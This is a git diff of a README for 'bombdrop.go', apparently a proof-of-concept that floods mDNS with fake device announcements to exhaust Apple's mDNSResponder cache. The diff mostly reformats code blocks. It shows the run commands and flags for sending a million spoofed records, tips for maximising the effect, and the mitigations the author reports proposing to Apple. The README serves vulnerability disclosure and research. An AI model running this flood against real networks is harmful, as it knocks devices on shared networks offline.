@@ -79,18 +79,19 @@ NOTE: Running this on MacOS will cause the mDNSResponder fight the POC. You shou
 
 For best results, use the following command:
 
-```
+```shell
 go run bombdrop.go -i <your interface> -n 1000000 -type airplay -ttl-mode extreme -name-mode dynami
+```
 
 Other examples: 
 
-```
+```shell
 go run bombdrop.go -i ens160 -n 1000000 -type airplay -ttl-mode extreme -name-mode dynamic
 ```
 
 
-```
 Usage:
+```shell
   sudo go run bombdrop.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-c 10] [-type all]
 
 Options:
@@ -106,6 +107,7 @@ Options:
   -ttl-mode <mode> TTL mode: normal, long, extreme (default: normal)
   -name-mode <m>   Device naming mode: static, dynamic, compare (default: mixed)
   -pregenerate     Pre-generate
+```
 
 Examples:
   # Basic usage with 5000 devices
@@ -128,7 +130,6 @@ Notes:
   - For broadcast: use your subnet's broadcast (typically x.x.x.255)
   - For /31 networks: there is no broadcast address, use multicast or direct IP
   - Root/admin privileges are usually required for multicast
-```
 
 For the best results:
 1. Use randomized device names to ensure uniqueness, preventing cache consolidation
@@ -172,10 +173,12 @@ Apple M* chips seem to be impacted more than Intel chips. Not sure why but I did
 In my disclosure to Apple, I proposed several mitigations to improve mDNSResponder’s resilience under cache exhaustion, including: limiting the number of records accepted per source IP or MAC, rate-limiting high-volume multicast announcements, improving eviction priority in cache management, and implementing stricter TTL handling to avoid record retention abuse. I also pointed out that mDNSResponder processes multicast traffic without scrutiny, on a single thread, and trusts all records equally — a dangerous assumption in 2025’s untrusted network environments.
 One telling comment in Apple’s own source code reinforces this design flaw:
 
-```
-// All records in a DNS response packet are treated as equally valid statements of truth. If we want
-// to guard against spoof responses, then the only credible protection against that is cryptographic
-// security, e.g. DNSSEC., not worrying about which section in the spoof packet contained the record.
+```c
+// in mDNSCore/mDNS.c
+
+All records in a DNS response packet are treated as equally valid statements of truth. If we want
+to guard against spoof responses, then the only credible protection against that is cryptographic
+security, e.g. DNSSEC., not worrying about which section in the spoof packet contained the record.
 ```
 
 This trust model, suitable for the early 2000s, no longer holds up in hostile or crowded networks like schools, Apple's own stores, airports, or ISP-shared segments. Apple should treat unsolicited multicast data with suspicion and enforce boundaries within mDNSResponder accordingly.
